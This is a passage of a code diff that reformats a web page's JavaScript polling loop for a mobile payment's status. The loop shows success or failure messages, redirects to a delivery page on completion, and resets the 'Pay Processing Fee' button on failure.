-                    status === "FAILED"
-                ){
-
-                    clearInterval(
-                        interval
-                    );
-
-                    document.getElementById(
-                        "stkMessage"
-                    ).innerHTML =
-                        "❌ Payment " +
-                        status.toLowerCase() +
-                        ".";
-
-                    document.getElementById(
-                        "payBtn"
-                    ).disabled = false;
-
-                    document.getElementById(
-                        "payBtn"
-                    ).innerHTML =
-                        "Pay Processing Fee";
-                }
-
-            }catch(error){
-
-                console.log(
-                    "STATUS ERROR:",
-                    error
-                );
-
+            if (!result.success || !result.data) {
+                return;
             }
 
-        },3000);
+            let payment = result.data;
+            let status = String(payment.status || "").toUpperCase();
 
+            /* PAYMENT SUCCESS */
+
+            if (status === "COMPLETED") {
+                clearInterval(interval);
+
+                document.getElementById("stkMessage").innerHTML =
+                    "✅ Payment successful. Redirecting...";
+
+                window.location.href = "delivery.html";
+            }
+
+            /* PAYMENT FAILED */
+
+            else if (
+                status === "CANCELLED" ||
+                status === "FAILED"
+            ) {
+                clearInterval(interval);
+
+                document.getElementById("stkMessage").innerHTML =
+                    "❌ Payment " + status.toLowerCase() + ".";
+
+                document.getElementById("payBtn").disabled = false;
+
+                document.getElementById("payBtn").innerHTML =
+                    "Pay Processing Fee";
+            }
+
+        } catch (error) {
+            console.log("STATUS ERROR:", error);
+        }
+    }, 3000);
 }
-
-</script>
-
-</body>
+</script></body>
 </html>
